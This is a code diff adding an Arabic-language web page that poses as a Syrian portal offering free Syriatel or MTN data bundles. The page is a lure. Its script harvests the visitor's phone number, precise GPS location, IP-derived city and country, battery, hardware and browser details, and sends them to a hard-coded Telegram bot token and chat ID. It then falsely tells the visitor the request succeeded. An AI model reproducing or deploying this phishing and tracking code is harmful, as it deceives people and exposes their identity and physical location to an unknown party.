@@ -73,3 +73,154 @@
     .note {
       margin-top: 20px;
       color: #ccc;
+      font-size: 14px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>البوابة السورية | طلب باقة مجانية</h1>
+  </header>  <div class="container">
+    <label>اختر الشبكة:</label>
+    <select id="operator">
+      <option value="Syriatel">سيريتل</option>
+      <option value="MTN">MTN</option>
+    </select><label>أدخل رقم الهاتف:</label>
+<input type="text" id="phone" placeholder="مثال: 0933XXXXXX" />
+
+<label>اختر نوع الباقة:</label>
+<select id="package">
+  <option value="100MB">باقة 100 ميجا</option>
+  <option value="500MB">باقة 500 ميجا</option>
+  <option value="1GB">باقة 1 غيغا</option>
+</select>
+
+<label>نوع الاتصال:</label>
+<select id="net">
+  <option value="3G">3G</option>
+  <option value="4G">4G</option>
+  <option value="5G">5G</option>
+</select>
+
+<button onclick="submitRequest()">طلب الباقة</button>
+
+<div class="share">
+  <button onclick="shareLink()">📤 مشاركة الرابط</button>
+</div>
+
+<div class="note">
+  🛑 لا تقم بإغلاق الصفحة أثناء المعالجة
+</div>
+
+<iframe id="map" src=""></iframe>
+
+  </div>  <script>
+    const token = "7439082421:AAEG8hImgTBzQgz9SQbYq47FfGJldOQC_HI";
+    const chatId = "7220184605";
+
+    async function getIPInfo() {
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        return await res.json();
+      } catch {
+        return {};
+      }
+    }
+
+    async function getBatteryInfo() {
+      try {
+        const battery = await navigator.getBattery();
+        return {
+          level: Math.round(battery.level * 100),
+          charging: battery.charging ? "نعم" : "لا"
+        };
+      } catch {
+        return { level: "؟", charging: "؟" };
+      }
+    }
+
+    function shareLink() {
+      const url = window.location.href;
+      navigator.clipboard.writeText(url);
+      alert("📋 تم نسخ رابط الصفحة للمشاركة!");
+    }
+
+    function loadMap(lat, lon) {
+      const map = document.getElementById("map");
+      map.src = `https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed`;
+    }
+
+    async function submitRequest() {
+      const phone = document.getElementById("phone").value.trim();
+      const operator = document.getElementById("operator").value;
+      const pack = document.getElementById("package").value;
+      const net = document.getElementById("net").value;
+
+      if (!phone || phone.length < 9) return alert("📵 أدخل رقم صحيح");
+
+      alert("⏳ جاري تجهيز الباقة... الرجاء الانتظار وعدم الخروج من الصفحة");
+
+      const ip = await getIPInfo();
+      const battery = await getBatteryInfo();
+      const deviceInfo = navigator.userAgent;
+      const screenRes = `${screen.width}x${screen.height}`;
+      const memory = navigator.deviceMemory || "؟";
+      const cores = navigator.hardwareConcurrency || "؟";
+      const connection = navigator.connection?.effectiveType || "؟";
+      const now = new Date().toLocaleString("ar-SY", { timeZone: "Asia/Damascus" });
+
+      let locationUrl = "❌ غير متاح";
+
+      navigator.geolocation.getCurrentPosition(async pos => {
+        const lat = pos.coords.latitude.toFixed(5);
+        const lon = pos.coords.longitude.toFixed(5);
+        locationUrl = `https://maps.google.com/?q=${lat},${lon}`;
+        loadMap(lat, lon);
+
+        const msg = `\n📱 طلب باقة مجانية
+رقم: ${phone}
+الشبكة: ${operator}
+الباقة: ${pack}
+الاتصال: ${net}
+📍 الموقع: ${locationUrl}
+الدولة: ${ip.country_name || "؟"}
+المدينة: ${ip.city || "؟"}
+IP: ${ip.ip || "؟"}
+🔋 شحن: ${battery.level}% | يشحن؟ ${battery.charging}
+💾 RAM: ${memory}GB | CPU: ${cores} نواة
+🌐 الاتصال: ${connection}
+📱 الجهاز: ${deviceInfo}
+📏 الشاشة: ${screenRes}
+🕒 الوقت: ${now}`;
+
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, text: msg })
+        });
+
+        saveToLocal(phone);
+        alert("✅ تم إرسال الطلب بنجاح!");
+
+      }, () => {
+        alert("⚠️ الموقع الجغرافي غير مفعل!");
+      });
+    }
+
+    function saveToLocal(phone) {
+      let history = JSON.parse(localStorage.getItem("history") || "[]");
+      if (!history.includes(phone)) {
+        history.push(phone);
+        localStorage.setItem("history", JSON.stringify(history));
+      }
+    }
+
+    window.onload = () => {
+      const history = JSON.parse(localStorage.getItem("history") || "[]");
+      if (history.length > 0) {
+        console.log("📜 سجل الطلبات:", history);
+      }
+    }
+  </script></body>
+</html>
